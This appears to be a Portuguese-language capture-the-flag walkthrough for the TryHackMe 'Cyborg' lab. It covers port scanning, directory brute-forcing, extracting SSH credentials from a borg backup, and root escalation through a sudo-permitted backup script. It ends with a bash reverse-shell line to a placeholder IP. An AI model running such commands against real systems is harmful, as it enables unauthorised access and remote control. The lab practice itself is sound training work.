#ctf
https://tryhackme.com/room/cyborgt8

## Recon

Usando **NMAP**:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

Fazendo uma bruteforce de diretórios com o **gobuster** os seguintes caminhos foram encontrados

- /admin -> website
- /etc -> existe credenciais: music_archive:squidward

Em `/admin` é possível baixar um backup feita com a ferramenta `borg`, rodando os comando abaixo para ver o backup consegui extrair as credenciais de ssh `alex:S3cretP@s3`em `/home/alex/Documents/note.txt`. (A senha é squidward).

```sh
cd home/field/dev/final_archive
borg list .
borg extract --list .::music_archive
```

## Privesc

Existe um arquivo `/etc/mp3backups/backup.sh` que permite rodar como root sem a necessidade de inserir a senha. Lendo este arquivo, existe um opção **-c** que executa comandos, com isso basta executar o código abaixo:

```sh
cd /etc/mp3backups
sudo -u root ./backup.sh -c su root
sh -i >& /dev/tcp/IP/4444 0>&1 # mesmo com root, os comandos não geravam output, então, me conectando com minha máquina passando o shell, consegui ver os outputs
```

